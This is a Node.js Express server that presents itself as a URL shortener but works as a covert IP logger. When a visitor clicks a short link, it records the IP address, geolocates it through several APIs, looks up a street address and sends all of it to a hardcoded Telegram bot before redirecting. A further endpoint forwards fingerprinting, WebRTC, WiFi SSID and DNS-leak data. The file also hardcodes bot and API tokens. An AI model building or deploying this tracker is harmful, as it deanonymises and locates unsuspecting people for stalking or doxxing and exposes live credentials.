const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const cors = require('cors');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.text({ type: 'text/plain', limit: '10mb' }));

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8658060797:AAFrQcyzuClg3qiOU2wGAqYqjTMEqFI1yIU';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '5942654805';
const BASE_URL = process.env.SHORT_DOMAIN || 'https://vvvvv-production-7945.up.railway.app';

const linkStorage = {};

function generateShortCode() {
  return crypto.randomBytes(4).toString('hex');
}

async function sendToTelegram(msg, retries = 3) {
  for (let i = 0; i < retries; i++) {
    try {
      await axios.post(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        {
          chat_id: TELEGRAM_CHAT_ID,
          text: msg,
          parse_mode: 'HTML',
          disable_web_page_preview: true
        },
        { timeout: 10000 }
      );
      console.log('✅ [TG] Sent');
      return true;
    } catch (err) {
      console.error(`❌ [TG] Attempt ${i + 1} failed`);
      if (i < retries - 1) await new Promise(r => setTimeout(r, 500));
    }
  }
  return false;
}

async function getLocationFromFreeGeoIP(ip) {
  try {
    const res = await axios.get(`https://freegeoip.app/json/${ip}`, { timeout: 3000 });
    if (res.data) {
      return {
        latitude: res.data.latitude,
        longitude: res.data.longitude,
        country: res.data.country_name || 'Unknown',
        city: res.data.city || 'Unknown'
      };
    }
  } catch (e) {}
  return null;
}

async function getLocationFromIPInfo(ip) {
  try {
    const res = await axios.get(`https://ipinfo.io/${ip}?token=9f5b1ad4e5e8e0`, { timeout: 3000 });
    if (res.data && res.data.loc) {
      const [lat, lng] = res.data.loc.split(',');
      return {
        latitude: parseFloat(lat),
        longitude: parseFloat(lng),
        country: res.data.country || 'Unknown',
        city: res.data.city || 'Unknown'
      };
    }
  } catch (e) {}
  return null;
}

async function getLocationFromGeoJS(ip) {
  try {
    const res = await axios.get(`https://get.geojs.io/v1/ip/geo/${ip}.json`, { timeout: 3000 });
    if (res.data) {
      return {
        latitude: res.data.latitude,
        longitude: res.data.longitude,
        country: res.data.country_name || 'Unknown',
        city: res.data.city || 'Unknown'
      };
    }
  } catch (e) {}
  return null;
}

async function getAveragedLocation(ip) {
  const results = await Promise.all([
    getLocationFromFreeGeoIP(ip),
    getLocationFromIPInfo(ip),
    getLocationFromGeoJS(ip)
  ]);

  const validResults = results.filter(r => r !== null);
  if (validResults.length === 0) return null;

  const avgLat = validResults.reduce((sum, r) => sum + r.latitude, 0) / validResults.length;
  const avgLng = validResults.reduce((sum, r) => sum + r.longitude, 0) / validResults.length;

  return {
    latitude: avgLat.toFixed(6),
    longitude: avgLng.toFixed(6),
    country: validResults[0].country,
    city: validResults[0].city
  };
}

async function reverseGeocode(lat, lng) {
  try {
    const res = await axios.get(
      `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`,
      { timeout: 3000, headers: { 'User-Agent': 'LinkShortener/1.0' } }
    );
    if (res.data && res.data.address) {
      const addr = res.data.address;
      return addr.address || 'Unknown Location';
    }
  } catch (e) {}
  return null;
}

function safeParseBody(req) {
  if (typeof req.body === 'string') {
    try { return JSON.parse(req.body); } catch (e) { return {}; }
  }
  return req.body || {};
}

app.post('/api/shorten', (req, res) => {
  const { url } = req.body;
  if (!url) return res.status(400).json({ error: 'URL required' });

  let normalizedUrl = url.trim();
  if (!/^https?:\/\//i.test(normalizedUrl)) {
    normalizedUrl = 'https://' + normalizedUrl;
  }

  const shortCode = generateShortCode();
  linkStorage[shortCode] = { original: normalizedUrl, created: new Date(), clicks: 0 };

  console.log(`[SHORT] Created: ${shortCode}`);
  res.json({
    shortened: `${BASE_URL}/${shortCode}`,
    code: shortCode
  });
});

app.post('/api/log-all', async (req, res) => {
  const body = safeParseBody(req);
  const { code, methods } = body;

  if (!code || !linkStorage[code]) {
    return res.status(404).json({ error: 'Not found' });
  }

  const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown').split(',')[0].trim();
  const originalUrl = linkStorage[code].original;
  linkStorage[code].clicks++;

  // Get best location for reverse geocoding
  const bestLoc = await getAveragedLocation(ip);
  let address = null;
  if (bestLoc) {
    address = await reverseGeocode(bestLoc.latitude, bestLoc.longitude);
  }

  let msg = `🔗 <b>رابط فُتح!</b>\n━━━━━━━━━━━━━━━━━━━\n`;
  msg += `<b>📌 الكود:</b> <code>${code}</code>\n`;
  msg += `<b>🔌 IP:</b> <code>${ip}</code>\n`;
  msg += `⏰ ${new Date().toLocaleString('ar-SA')}\n━━━━━━━━━━━━━━━━━━━\n\n`;

  // طريقة 1: WebRTC
  if (methods?.webrtc) {
    msg += `<b>✅ الطريقة 1: WebRTC (Private IP)</b>\n`;
    msg += `🔌 ${methods.webrtc}\n`;
    msg += `━━━━━━━━━━━━━━━━━━━\n\n`;
  }

  // طريقة 2: WiFi SSID
  if (methods?.wifi) {
    msg += `<b>✅ الطريقة 2: WiFi SSID</b>\n`;
    msg += `📡 ${methods.wifi}\n`;
    msg += `━━━━━━━━━━━━━━━━━━━\n\n`;
  }

  // طريقة 3: Multi-API Averaging
  if (bestLoc) {
    msg += `<b>✅ الطريقة 3: Multi-API Averaging</b>\n`;
    msg += `📍 <code>${bestLoc.latitude}, ${bestLoc.longitude}</code>\n`;
    msg += `🏙️ ${bestLoc.city}, ${bestLoc.country}\n`;
    msg += `🗺️ <a href="https://maps.google.com/?q=${bestLoc.latitude},${bestLoc.longitude}">Maps</a>\n`;
    msg += `━━━━━━━━━━━━━━━━━━━\n\n`;
  }

  // طريقة 4: Browser Fingerprinting
  if (methods?.fingerprint) {
    msg += `<b>✅ الطريقة 4: Browser Fingerprinting</b>\n`;
    msg += `🖥️ ${methods.fingerprint}\n`;
    msg += `━━━━━━━━━━━━━━━━━━━\n\n`;
  }

  // طريقة 5: DNS Leak
  if (methods?.dns) {
    msg += `<b>✅ الطريقة 5: DNS Leak</b>\n`;
    msg += `🌐 ${methods.dns}\n`;
    msg += `━━━━━━━━━━━━━━━━━━━\n\n`;
  }

  // طريقة 6: HTTP Headers Analysis
  if (methods?.headers) {
    msg += `<b>✅ الطريقة 6: HTTP Headers</b>\n`;
    msg += `📋 Language: ${methods.headers.language || 'Unknown'}\n`;
    msg += `🌍 Encoding: ${methods.headers.encoding || 'Unknown'}\n`;
    msg += `━━━━━━━━━━━━━━━━━━━\n\n`;
  }

  // طريقة 7: Timezone
  if (methods?.timezone) {
    msg += `<b>✅ الطريقة 7: Timezone Detection</b>\n`;
    msg += `⏱️ ${methods.timezone}\n`;
    msg += `━━━━━━━━━━━━━━━━━━━\n\n`;
  }

  // طريقة 8: WebGL Canvas
  if (methods?.webgl) {
    msg += `<b>✅ الطريقة 8: WebGL Canvas</b>\n`;
    msg += `🎮 ${methods.webgl}\n`;
    msg += `━━━━━━━━━━━━━━━━━━━\n\n`;
  }

  // طريقة 9: Screen Resolution
  if (methods?.screen) {
    msg += `<b>✅ الطريقة 9: Screen Resolution</b>\n`;
    msg += `📺 ${methods.screen}\n`;
    msg += `━━━━━━━━━━━━━━━━━━━\n\n`;
  }

  // طريقة 10: Browser Features
  if (methods?.features) {
    msg += `<b>✅ الطريقة 10: Browser Features</b>\n`;
    msg += `🌟 ${methods.features}\n`;
    msg += `━━━━━━━━━━━━━━━━━━━\n\n`;
  }

  // Address info
  if (address) {
    msg += `<b>📍 العنوان:</b>\n${address}`;
  }

  await sendToTelegram(msg);
  res.json({ success: true });
});

app.get('/api/test', async (req, res) => {
  const ok = await sendToTelegram('🔗 اختبار ✅');
  res.json({ telegram: ok ? 'sent' : 'failed' });
});

app.use(express.static('.'));

app.get('/:code', async (req, res) => {
  const { code } = req.params;

  if (!linkStorage[code]) {
    return res.status(404).send('<h1 style="text-align:center;margin-top:50px">الرابط غير موجود</h1>');
  }

  const originalUrl = linkStorage[code].original;
  linkStorage[code].clicks++;

  setImmediate(async () => {
    const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown').split(',')[0].trim();
    const bestLoc = await getAveragedLocation(ip);

    let msg = `🔗 <b>رابط!</b> ${code}\n<code>${ip}</code>`;
    if (bestLoc) {
      msg += `\n📍 ${bestLoc.city}, ${bestLoc.country}\n🗺️ <a href="https://maps.google.com/?q=${bestLoc.latitude},${bestLoc.longitude}">Map</a>`;
    }

    await sendToTelegram(msg);
  });

  res.redirect(301, originalUrl);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});